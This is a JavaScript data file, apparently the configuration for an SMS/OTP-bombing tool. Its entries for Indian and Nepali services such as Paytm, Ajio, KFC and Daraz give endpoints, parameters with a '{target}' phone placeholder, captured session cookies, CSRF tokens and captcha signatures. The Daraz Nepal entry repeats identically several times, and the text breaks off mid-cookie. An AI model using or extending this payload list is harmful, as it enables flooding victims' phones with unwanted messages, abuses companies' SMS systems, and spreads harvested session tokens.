const indianSpamData = [
  {
    name: "confirmtkt",
    method: "GET",
    url: "https://securedapi.confirmtkt.com/api/platform/register",
    params: {
      newOtp: "true",
      mobileNumber: "{target}",
    },
    identifier: "false",
  },
  {
    name: "justdial",
    method: "GET",
    url: "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
    params: {
      mobile: "{target}",
    },
    identifier: "sent",
  },

  {
    name: "cityflo",
    method: "POST",
    url: "https://cityflo.com/website-app-download-link-sms/",
    data: {
      mobile_number: "{target}",
    },
    identifier: "sent",
  },
  {
    name: "nnnow",
    method: "POST",
    url: "https://api.nnnow.com/d/api/appDownloadLink",
    data: {
      mobileNumber: "{target}",
    },
    identifier: "true",
  },
  {
    name: "ajio",
    method: "POST",
    url: "https://login.web.ajio.com/api/auth/signupSendOTP",
    data: {
      firstName: "xxps",
      login: "wiqpdl223@wqew.com",
      password: "QASpw@1s",
      genderType: "Male",
      mobileNumber: "{target}",
      requestType: "SENDOTP",
    },
    identifier: "1",
  },
  {
    name: "happyeasygo",
    method: "GET",
    url: "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do",
    params: {
      phone: "91%20{target}",
    },
    identifier: "true",
  },
  {
    name: "unacademy",
    method: "POST",
    url: "https://unacademy.com/api/v1/user/get_app_link/",
    data: {
      phone: "{target}",
    },
    identifier: "sent",
  },
  {
    name: "treebo",
    method: "POST",
    url: "https://www.treebo.com/api/v2/auth/login/otp/",
    data: {
      phone_number: "{target}",
    },
    identifier: "sent",
  },
  {
    name: "airtel",
    method: "GET",
    url: "https://www.airtel.in/referral-api/core/notify",
    params: {
      messageId: "map",
      rtn: "{target}",
    },
    identifier: "Success",
  },
  {
    name: "pharmeasy",
    method: "POST",
    url: "https://pharmeasy.in/api/auth/requestOTP",
    json: {
      contactNumber: "{target}",
    },
    identifier: "resendSmsCounter",
  },
  {
    name: "mylescars",
    method: "POST",
    url: "https://www.mylescars.com/usermanagements/chkContact",
    data: {
      contactNo: "{target}",
    },
    identifier: "success@::::",
  },
  {
    name: "grofers",
    method: "POST",
    url: "https://grofers.com/v2/accounts/",
    data: {
      user_phone: "{target}",
    },
    headers: {
      auth_key:
        "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7",
    },
    identifier: "We have sent",
  },
  {
    name: "dream11",
    method: "POST",
    url: "https://api.dream11.com/sendsmslink",
    data: {
      siteId: "1",
      mobileNum: "{target}",
      appType: "androidfull",
    },
    identifier: "true",
  },
  {
    name: "cashify",
    method: "GET",
    url: "https://www.cashify.in/api/cu01/v1/app-link",
    params: {
      mn: "{target}",
    },
    identifier: "Successfully",
  },
  {
    name: "paytm",
    method: "POST",
    url: "https://commonfront.paytm.com/v4/api/sendsms",
    data: {
      phone: "{target}",
      guid: "2952fa812660c58dc160ca6c9894221d",
    },
    identifier: "202",
  },
  {
    name: "kfc-in",
    method: "POST",
    url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
    headers: {
      Referer: "https://online.kfc.co.in/login",
      __RequestVerificationToken:
        "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01",
    },
    json: {
      AuthorizedFor: "3",
      phoneNumber: "{target}",
      Resend: "false",
    },
    identifier: "true",
  },
  {
    name: "indialends",
    method: "POST",
    url: "https://indialends.com/internal/a/mobile-verification_v2.ashx",
    cookies: {
      _ga: "GA1.2.1483885314.1559157646",
      _fbp: "fb.1.1559157647161.1989205138",
      TiPMix: "91.9909185226964",
      gcb_t_track: "SEO - Google",
      gcb_t_keyword: "",
      gcb_t_l_url: "https://www.google.com/",
      gcb_utm_medium: "",
      gcb_utm_campaign: "",
      "ASP.NET_SessionId": "ioqkek5lbgvldlq4i3cmijcs",
      web_app_landing_utm_source: "",
      web_app_landing_url: "/personal-loan",
      webapp_landing_referral_url: "https://www.google.com/",
      ARRAffinity:
        "747e0c2664f5cb6179583963d834f4899eee9f6c8dcc773fc05ce45fa06b2417",
      _gid: "GA1.2.969623705.1560660444",
      _gat: "1",
      current_url: "https://indialends.com/personal-loan",
      cookies_plbt: "0",
    },
    headers: {
      Referer: "https://indialends.com/personal-loan",
    },
    data: {
      aeyder03teaeare: "1",
      ertysvfj74sje: "{cc}",
      jfsdfu14hkgertd: "{target}",
      lj80gertdfg: "0",
    },
    identifier: "1",
  },
];

export default indianSpamData;

export const nepalData = [
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33",
    },
    identifier: '"notSuccess":false',
  },
  {
    name: "Daraz Nepal",
    method: "POST",
    url: "https://member.daraz.com.np/user/api/sendVerificationSms",
    data: {
      phone: "{target}",
      type: "OTP_REGISTER",
      lzdAppVersion: "1.0",
      "X-CSRF-TOKEN": "57343b8557abe",
      ncToken: {
        csessionid:
          "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
        sig: "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
        token: "QPXW:1638536554908:0.22529358478093664",
      },
    },
    headers: {
      "X-CSRF-TOKEN": "57343b8557abe",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://member.daraz.com.np",
      Referer:
        "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
      Cookie:
        "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; 